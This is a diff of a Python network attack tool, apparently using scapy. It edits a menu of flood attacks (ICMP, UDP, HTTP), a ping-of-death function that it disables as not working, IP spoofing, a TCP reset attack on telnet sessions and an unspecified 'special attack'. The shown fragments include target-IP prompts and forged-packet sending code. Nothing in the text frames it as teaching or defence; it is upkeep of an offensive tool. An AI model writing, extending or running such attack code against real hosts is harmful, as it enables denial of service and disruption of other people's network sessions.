@@ -22,9 +22,9 @@ def attack_to_perform(number):
         14: perform_icmp_flood_attack,  # icmp flood attack (ok)
         15: perform_udp_flood_attack,  # udp flood attack (ok)
         16: perform_http_flood_attack,  # http flood attack (ok)
-        17: perform_ping_of_death,  # ping of death (ok)
-        18: perform_tcp_rst_on_telnet,  # tcp rst on telnet (ok)
-        19: perform_special_attack,  # special attack
+        #1*: perform_ping_of_death,  # ping of death (ok)
+        17: perform_tcp_rst_on_telnet,  # tcp rst on telnet (ok)
+        18: perform_special_attack,  # special attack
     }
 
     if number in switch:
@@ -52,9 +52,9 @@ def print_attack_menu():
     print("(14) ICMP Flood Attack")
     print("(15) UDP Flood Attack")
     print("(16) HTTP Flood Attack")
-    print("(17) Ping of Death")
-    print("(18) TCP RST on Telnet")
-    print("(19) Special Attack")
+    #print("(1*) Ping of Death")
+    print("(17) TCP RST on Telnet")
+    print("(18) Special Attack")
     print("-----------------------------------------------------")
     print()
 
@@ -295,7 +295,7 @@ def perform_ip_spoofing(src_ip=None, dst_ip=None, packet_data=None):
         # Get input from the user
         packet_data = input("Enter the packet data: ")
 
-    packet = IP(src=src_ip, dst=dst_ip) / packet_data
+    packet = IP(src=src_ip, dst=dst_ip) / ICMP() / packet_data
 
     packet_counter = 0
 
@@ -490,7 +490,8 @@ def perform_http_flood_attack(ip_addr=None, port=80):
     return "HTTP flood attack performed on " + ip_addr + " to port " + str(port)
 
 
-# (17) Code to perform ping of death attack
+# (1*) Code to perform ping of death attack  -- NOT WORKING
+"""
 def perform_ping_of_death(ip_addr=None):
     if not ip_addr:
         # Get input from the user
@@ -501,11 +502,11 @@ def perform_ping_of_death(ip_addr=None):
     send(5 * packet)
 
     return "Ping of death attack performed on " + ip_addr
+"""
 
-
-# (18) Code to perform TCP reset attack on telnet
+# (17) Code to perform TCP reset attack on telnet
 def perform_tcp_rst_on_telnet():
-    print("Telnet Reset\n")
+    print("Telnet Reset")
     host1 = input("Enter the IP address to attack (the one who requested the telnet): ")
     host2 = input("Enter the IP address of the target of Telnet: ")
     interface = "eth0"
@@ -533,7 +534,7 @@ def perform_tcp_rst_on_telnet():
     return "TCP reset attack performed on " + host1
 
 
-# (19) Code to perform Special attack
+# (18) Code to perform Special attack
 def perform_special_attack(ip_addr=None):
     if not ip_addr:
         # Get input from the user
